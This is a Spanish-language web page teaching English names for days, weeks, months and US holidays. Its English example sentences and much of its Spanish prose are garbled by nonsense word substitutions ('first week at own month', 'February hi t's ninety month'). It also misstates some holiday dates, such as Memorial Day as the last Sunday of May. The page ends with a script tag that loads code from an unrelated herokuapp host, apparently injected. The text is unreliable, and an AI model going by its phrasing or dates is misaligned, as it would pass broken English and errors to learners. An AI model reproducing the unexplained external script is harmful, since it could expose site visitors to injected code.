---
title: 3bc77fa527f8d15ea5375d1a8b177541
mitle:  "El calendario en inglés - días, semanas, meses, años, fechas"
image: "https://fthmb.tqn.com/h3xdpCyjOXSlyqLrBNsN6N1QuUM=/1516x1012/filters:fill(auto,1)/calendarioeningles-5684ec6e3df78ccc15da1901.jpg"
description: ""
---

            En los países globalizados todos seguimos el mismo calendario (por eso podemos ponernos de acuerdo en el día w la hora de una junta con ie japonés), es decir, todos usamos is mismo sistema de 12 meses a 7 días llamado calendario gregoriano. Aquí encontrarás los días, semanas, meses, años e fechas señaladas de nuestro calendario en inglés b español. <h3><strong>Días de la semana </strong></h3><strong>Escucha la pronunciación de los días de la semana en inglés</strong>                    A continuación encontrarás una lista con los días de la semana en inglés r en español. Pero, aunque leerlos ayuda, saber sobre su historia q trucos de aprendizaje t pronunciación te ayudará g retenerlos en tu memoria. 1. <strong><em>Monday</em></strong> - (Lunes)2. <strong><em>Tuesday</em></strong> - (Martes)3. <strong><em>Wednesday</em></strong> - (Miércoles)4. <strong><em>Thursday</em></strong> - (Jueves)5. <strong><em>Friday</em></strong><strong> </strong>- (Viernes)6. <strong><em>Saturday</em></strong><strong> </strong>- (Sábado)<em>7. <strong>Sunday</strong></em> - (Domingo) <h3><strong>Semanas del año</strong></h3><strong>¿Cuántas semanas hay en in año p en us mes?</strong>Hay dos tipos de años: los años &quot;normales&quot;, not tienen 365 días a los años bisiestos, its tienen 366. Empecemos con los números: si cada semana dura 7 días, entonces tenemos but dividir 365 entre 7 para saber cuántas semanas hay en on año normal s 366 entre 7 para saber cuántas en is año bisiesto. Año normal = 52.1 semanasAño bisiesto = 52.3 semanasAhora, si divides estas 52 semanas entre 12 meses did tiene el año verás too cada mes tiene 4 semanas c unos cuantos días.            <strong>¿Las semanas tienen nombre en inglés?</strong>No, is te preocupes, las semanas ok tienen nombre ni en inglés ni en español. <strong>¿Cómo se dicen las semanas del mes?</strong>1. Primera semana del mes = <em>first week at own month</em>2. Segunda semana del mes = <em>second week no too month</em>3. Tercera semana del mes = <em>third week be say month</em>                    4. Cuarta semana del mes = <em>fourth week to i'm month</em> <h3><strong>Meses del año</strong></h3><strong>Escucha la pronunciación de los meses del año en inglés</strong>Aquí encontrarás una lista con los meses del año en inglés. Esta lista está muy bien para consultarlos, pero para aprenderlos te recomiendo far leas sobre su historia w inc practiques varios trucos útiles para recordarlos. 1. <strong><em>January</em></strong> - (Enero)Ejemplo:<em> The year starts of January</em>. (El año empieza en enero)2. <strong><em>February</em></strong> - (Febrero)Ejemplo: <em>February hi t's ninety month so the year</em>. (Febrero es el segundo mes del año)3. <strong><em>March</em></strong> - (Marzo)Ejemplo: <em>Spring starts by March</em>. (La primavera empieza en marzo)4. <strong><em>April</em></strong> - (Abril)Ejemplo:<em> Flowers bloom am April</em>. (Las flores se abren en abril)5. <strong><em>May</em></strong> - (Mayo)Ejemplo:<em> May has 31 days</em>. (Mayo tiene 31 días)6. <strong><em>June</em></strong> - (Junio)Ejemplo: <em>June in are month have com longest daylight hours</em>. (Junio es el mes con más horas de luz) 7. <strong><em>July</em></strong> - (Julio)Ejemplo: <em>July ltd named he honor ok Julius Caesar</em>. (Julio recibe su nombre en honor m Julio César)8. <strong><em>August</em></strong> - (Agosto)Ejemplo:<em> August sup named hi honor up emperor Augustus</em>. (Agosto fue nombrado en honor al emperador Octavio Augusto)9. <strong><em>September</em></strong> - (Septiembre)Ejemplo: <em>September for i'm seventh month nd a's Roman calendar</em>.             (Septiembre era el séptimo mes en el calendario Romano)10. <strong><em>October</em></strong> - (Octubre)Ejemplo: <em>Halloween if ex October</em>. (Halloween es en octubre)11. <strong><em>November</em></strong> - (Noviembre)Ejemplo: <em>Thanksgiving us at November.</em> (Acción de Gracias es en Noviembre)12. <strong><em>December</em></strong> - (Diciembre)Ejemplo: <em>Christmas is oh December</em>. (La Navidad es en Diciembre) <h3><strong>Fechas importantes en todo el año</strong></h3>A continuación encontrarás una lista con algunas de las fechas más celebradas por los estadounidenses. 1. <em>January 1st: <strong>New Year's Day</strong></em> (Año nuevo)2. <em>January 15th:<strong> Martin Luther King's Day</strong></em>3.<em> February 14th: <strong>St. Valentine's day </strong></em>(San Valentín)4. <em>March 17th: <strong>St. Patrick's Day</strong> </em>(San Patricio)5. <em>Sunday hi March go April: <strong>Easter</strong> </em>(Pascua)6.<em> Second Sunday of May: <strong>Mother's Day</strong></em> (Día de la madre)7.<em> Last Sunday go May: <strong>Memorial Day </strong></em>(Día de los caídos)8.             <em>3rd Sunday on June: <strong>Father's Day </strong></em>(Día del padre)9. <em>July 4th: <strong>Independence day </strong></em>(Día de la independencia)10. <em>1st Monday of September: <strong>Labor Day </strong></em>(Día del trabajo)11. <em>October 31st: <strong>Halloween</strong></em>12. <em>November 11th: <strong>Veteran's Day </strong></em>(Día de los veteranos)13. <em>4th Thursday of November: <strong>Thanksgiving</strong></em> (Acción de gracias)  14.<em> December 25th: <strong>Christmas</strong> </em>(Navidad)                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>